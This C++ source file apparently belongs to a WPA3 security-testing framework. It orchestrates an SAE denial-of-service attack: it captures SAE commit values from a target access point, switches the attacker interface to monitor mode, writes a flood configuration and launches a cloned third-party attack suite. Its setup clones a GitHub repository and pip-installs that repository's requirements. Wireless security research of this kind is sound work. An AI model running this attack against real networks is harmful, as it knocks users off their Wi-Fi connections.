#include "attacks/DoS_hard/SAE_DoS_wrapper/sae_dos_wrapper.h"

#include <chrono>
#include <filesystem>
#include <fstream>
#include <memory>
#include <string>
#include <thread>
#include <vector>

#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
#include "attacks/DoS_hard/dos_helpers.h"
#include "attacks/components/setup_connections.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "config/RunStatus.h"
#include "config/global_config.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "observer/resource_checker.h"
#include "observer/graph/graph_elements.h"
#include "system/hw_capabilities.h"

using namespace std;
using namespace filesystem;
using namespace chrono;

namespace wpa3_tester::sae_dos_wrapper{

static string get_suite_path(){
	return get_global_config().at("paths").at("WPA3_SAE_DoS_Research_Suite").get<string>();
}

void setup_attack(RunStatus &rs){
	components::client_ap_setup(rs);

	const string suite = get_suite_path();
	hw_capabilities::git_clone_or_pull("https://github.com/Omelug/WPA3-SAE-DoS-Research-Suite", suite);

	if(system("python3.10 --version > /dev/null 2>&1") != 0){
		log(LogLevel::INFO, "python3.10 not found, installing...");
		hw_capabilities::run_cmd({"apt-get", "install", "-y","python3.10"});
	}

	const string req = suite + "/requirements.txt"; //TODO move requirement aadn python3.10  to fork
	if(exists(req)){
		log(LogLevel::INFO, "Installing python dependencies from {}...", req);
		hw_capabilities::run_cmd({"python3.10","-m", "pip", "install", "-r" + req});
	}

	log(LogLevel::INFO, "SAE DoS Research Suite ready at {}", suite);
}

static void write_run_config(const string &config_path, const sae_helper::SAEPair &sae,
							  const string &ap_mac, const string &client_mac, const string &channel,
							  const string &att_iface, const nlohmann::json &att_cfg){
	const string scalar_hex  = sae_helper::bytes_to_hex_plain(sae.scalar);
	const string finite_hex  = sae_helper::bytes_to_hex_plain(sae.element);
	const string band        = att_cfg.at("adapter_band").get<string>();
	const string attack_type = att_cfg.at("attack_type").get<string>();
	const int ch_5           = att_cfg.at("channel_5ghz").get<int>();
	const int pps            = att_cfg.at("packets_per_second_limit").get<int>();
	const int burst          = att_cfg.at("burst_size_optimal").get<int>();
	const double gap         = att_cfg.at("inter_packet_gap").get<double>();
	const int duration       = att_cfg.at("attack_time_sec").get<int>();
	const int restarts       = att_cfg.at("max_restarts").get<int>();

	ofstream f(config_path);
	f << "target_bssid_5ghz: \"" << ap_mac << "\"\n"
	  << "target_bssid_2_4ghz: \"" << ap_mac << "\"\n\n"
	  << "sae_scalar_2_4_hex_list:\n  - \"" << scalar_hex << "\"\n"
	  << "sae_finite_2_4_hex_list:\n  - \"" << finite_hex << "\"\n"
	  << "sae_scalar_5_hex_list:\n  - \"" << scalar_hex << "\"\n"
	  << "sae_finite_5_hex_list:\n  - \"" << finite_hex << "\"\n\n"
	  << "scanner_interface: \"\"\n"
	  << "channel_2_4ghz: \"" << channel << "\"\n"
	  << "channel_5ghz: \"" << to_string(ch_5) << "\"\n\n"
	  << "target_sta_macs: [\"" << client_mac << "\"]\n"
	  << "target_sta_macs_5ghz_special: []\n"
	  << "target_sta_macs_2_4ghz_special: []\n\n"
	  << "adapter_konfiguration:\n"
	  << "  " << att_iface << ":\n"
	  << "    band: \"" << band << "\"\n"
	  << "    angriff: \"" << attack_type << "\"\n\n"
	  << "packets_per_second_limit: " << pps << "\n"
	  << "burst_size_optimal: " << burst << "\n"
	  << "inter_packet_gap: " << gap << "\n"
	  << "experiment_duration: " << duration << "\n"
	  << "max_restarts: " << restarts << "\n";
}

void run_attack(RunStatus &rs){
	const ActorPtr attacker = rs.get_actor("attacker");
	const ActorPtr ap       = rs.get_actor("access_point");
	const ActorPtr client   = rs.get_actor("client");

	const auto ssid = rs.config().at("actors").at("access_point")
		.at("setup").at("program_config").at("ssid").get<string>();

	log(LogLevel::INFO, "Capturing SAE commit values...");
	const auto sae = cookie_guzzler::get_commit_values(
		rs, attacker["iface"], attacker["sniff_iface"], ssid, ap["mac"], 30);
	if(!sae.has_value()) throw run_err("Failed to capture SAE commit values");

	attacker->set_monitor_mode();
	attacker->set_iface_up();

	const auto &att_cfg = rs.config().at("attack_config");
	const string config_path = rs.run_folder()/"config.yaml";
	write_run_config(config_path, sae.value(), ap["mac"], client["mac"], ap["channel"], attacker["iface"], att_cfg);
	log(LogLevel::INFO, "Generated config.yaml at {}", config_path);

	rs.start_observers();
	log(LogLevel::INFO, "Starting WPA3-SAE-DoS-Research-Suite orchestrator...");

	rs.process_manager.run("attacker",
							{/*"setsid", */"python3.10", get_suite_path() + "/orchestator_master_en.py"},
							rs.run_folder()
	);

	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
	this_thread::sleep_for(seconds(attack_time));
	//rs.process_manager.stop("attacker");
	ap->conn->disconnect();
}

void stats_attack(const RunStatus &rs){
	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, {
		{"access_point", "did not acknowledge", "ACK_fail", "red"},
		{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
		{"access_point", "EAPOL-4WAY-HS-COMPLETED", "4Way", "green"},
		{"client", START_tag, "START", "black"},
		{"client", END_tag, "END", "black"},
	});
	const auto ap = rs.config().at("actors").at("access_point");
	observer::resource_checker::create_graph(rs, ap["source"], elements);
}
}
